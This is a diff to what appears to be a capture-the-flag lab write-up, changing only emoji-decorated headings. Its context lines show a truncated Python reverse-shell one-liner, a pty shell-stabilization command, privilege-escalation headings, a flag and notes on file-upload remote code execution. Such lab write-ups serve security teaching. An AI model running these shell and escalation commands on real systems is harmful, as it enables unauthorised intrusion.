@@ -119,7 +119,7 @@ python3 -c 'python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INE
 
 ---
 
-## 🔧 Shell Stabilization
+## Shell Stabilization
 
 ```zsh
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -127,7 +127,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ---
 
-## 🔍 Privilege Escalation
+## Privilege Escalation
 
 ### SUID Enumeration
 
@@ -174,7 +174,7 @@ THM{pr1v1l3g3_3sc4l4t10n}
 
 ---
 
-## ⚡ Key Takeaways
+## Key Takeaways
 
 * File upload vulnerabilities can lead to RCE
 * Extension filtering is often insufficient
